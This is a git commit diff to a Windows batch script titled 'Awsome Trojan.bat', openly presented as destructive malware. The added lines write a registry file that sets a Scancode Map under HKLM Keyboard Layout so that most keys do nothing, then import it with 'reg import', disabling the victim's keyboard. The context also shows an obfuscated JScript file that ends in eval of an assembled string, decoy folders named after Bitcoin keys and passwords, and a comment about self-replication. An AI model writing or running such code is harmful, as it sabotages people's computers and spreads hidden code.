80a5f4eb752747032ce60d3c75ecd904aa67dfe5
Err01 <132213761+Err01-Hub20@users.noreply.github.com>
2023-07-28 13:38:40 +0200

    Update Awsome Trojan.bat

--- Awsome Trojan.bat
+++ Awsome Trojan.bat
@@ -1,5 +1,10 @@
-
-:: Made by Frank South 20 
+:: #####################################
+:: ##         !!DANGEROUS!!           ##
+:: ##      DAMAGE RATE : HIGH         ##
+:: ##      THIS WILL TRASH A PC       ##
+:: ##      MADE BY FRANK SOUTH 20     ##
+:: ##       DON'T RUN THIS ON PC      ##
+:: #####################################
 
 @echo off 
 title System-Manager
@@ -39,46 +44,43 @@ echo mkdir 7ZaLpPa43UQ >>  Bitcoin-Private-Keys >> System.bat
 echo mkdir Ew220AqxLvB >>  Bitcoin-Private-Keys >> System.bat 
 echo mkdir BitcoinHacking >>  Bitcoin-Private-Keys >> System.bat 
 echo cd .. >> System.bat  
-echo mkdir HackingFuck >> System.bat 
-echo cd HackingFuck >> System.bat 
-echo mkdir Hahaahahha >> HackingFuck >> System.bat
-echo mkdir IPadress >> HackingFuck >> System.bat
-echo cd IPadress >> HackingFuck >> System.bat
-echo mkdir 192.168.1.103 >> IPadress >> HackingFuck >> System.bat
-echo cd .. >> HackingFuck >> System.bat
-echo mkdir KillComputerFucker >> System.bat 
 echo mkdir Passwords >> System.bat 
 echo cd Passwords >> System.bat  
 echo mkdir Passwordxyz >> Passwords >> System.bat
 echo mkdir LbYyuQw12Lm >> Passwords >> System.bat
 echo mkdir SwqLkJn33Fn >> Passwords >> System.bat
+echo mkdir AfGlqx90tC1 >> Passwords >> System.bat
+echo mkdir Herrljunga_Kommun123 >> Passwords >> System.bat
+echo mkdir Hervar_XcY12qw >> Passwords >> System.bat 
+echo cd .. >> System.bat 
+
 
 :: Nokeyboard registery Trojan
 
-echo echo Windows Registry Editor Version 5.00 > "repair.reg" 
-echo echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "repair.reg" 
-echo echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "repair.reg" 
-echo echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "repair.reg" 
-echo echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "repair.reg" 
-echo echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "repair.reg" 
-echo echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "repair.reg" 
-echo echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "repair.reg" 
-echo echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "repair.reg"  
-echo echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "repair.reg" 
-echo echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "repair.reg" 
-echo echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "repair.reg" 
-echo echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "repair.reg" 
-echo echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "repair.reg"
-echo echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "repair.reg"  
-echo echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "repair.reg" 
-echo echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "repair.reg" 
-echo echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "repair.reg" 
-echo echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "repair.reg" 
-echo echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "repair.reg" 
-echo echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "repair.reg" 
-echo echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "repair.reg" 
-echo echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "repair.reg"  
-echo reg import repair.reg  
+echo Windows Registry Editor Version 5.00 > "repair.reg" 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "repair.reg" 
+echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "repair.reg" 
+echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "repair.reg" 
+echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "repair.reg" 
+echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "repair.reg" 
+echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "repair.reg" 
+echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "repair.reg" 
+echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "repair.reg"  
+echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "repair.reg" 
+echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "repair.reg" 
+echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "repair.reg" 
+echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "repair.reg" 
+echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "repair.reg"
+echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "repair.reg"  
+echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "repair.reg" 
+echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "repair.reg" 
+echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "repair.reg" 
+echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "repair.reg" 
+echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "repair.reg" 
+echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "repair.reg" 
+echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "repair.reg" 
+echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "repair.reg"  
+reg import repair.reg  
 
 
 :: End 
@@ -177,3 +179,7 @@ echo     aLvd7sNl = aLvd7sNl["join"](''); >> Root.System.js
 echo     var ikarus=1; >> Root.System.js
 echo    @*/ >> Root.System.js
 echo     if (ikarus == 1) eval(aLvd7sNl); >> Root.System.js
+
+
+:: Trojan end 
+:: Copy the malware to other files and self replicate
